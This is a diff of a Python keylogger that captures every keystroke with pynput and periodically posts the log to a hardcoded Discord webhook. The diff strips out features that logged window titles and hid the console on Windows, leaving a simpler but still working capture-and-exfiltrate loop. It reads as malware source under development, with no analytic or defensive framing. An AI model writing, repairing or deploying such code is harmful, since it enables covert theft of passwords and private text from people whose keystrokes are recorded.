@@ -1,40 +1,23 @@
 import time
 import requests
 from pynput import keyboard
-import os
-import sys
-import win32gui
-import threading
 
+# Replace with your Discord webhook URL
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1350143720145686569/UcPvfxaryQuULwxeoIZCaPSPP57PiF9O6MDbWcmzpMyM-8PiLtrBaKEibfOmSH0jVrXf'
 
+# Buffer to store keystrokes
 key_buffer = []
-current_window = None
-
-def get_active_window_title():
-    """Get the title of the currently active window."""
-    window = win32gui.GetForegroundWindow()
-    title = win32gui.GetWindowText(window)
-    return title
 
 def send_to_discord(message):
     """Send the message to Discord using the webhook."""
     data = {
         "content": message
     }
-    try:
-        requests.post(WEBHOOK_URL, json=data)
-    except Exception as e:
-        print(f"Failed to send to Discord: {e}")
+    requests.post(WEBHOOK_URL, json=data)
 
 def on_press(key):
     """Callback function that is called whenever a key is pressed."""
-    global current_window
     try:
-        new_window = get_active_window_title()
-        if new_window != current_window:
-            current_window = new_window
-            key_buffer.append(f"\n[Window: {current_window}]\n")
         key_buffer.append(key.char)
     except AttributeError:
         if key == keyboard.Key.space:
@@ -57,16 +40,6 @@ def log_keys():
         if key_buffer:
             logged_keys = ''.join(key_buffer)
             send_to_discord(f"Keylog:\n```\n{logged_keys}\n```")
-            key_buffer.clear()  # Clear the buffer after sending
-
-def run_in_background():
-    """Run the script in the background on Windows."""
-    # Hide the console window
-    import ctypes
-    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-
-    # Start the keylogger
-    log_keys()
-
+            key_buffer.clear()
 if __name__ == "__main__":
-    run_in_background()
+    log_keys()
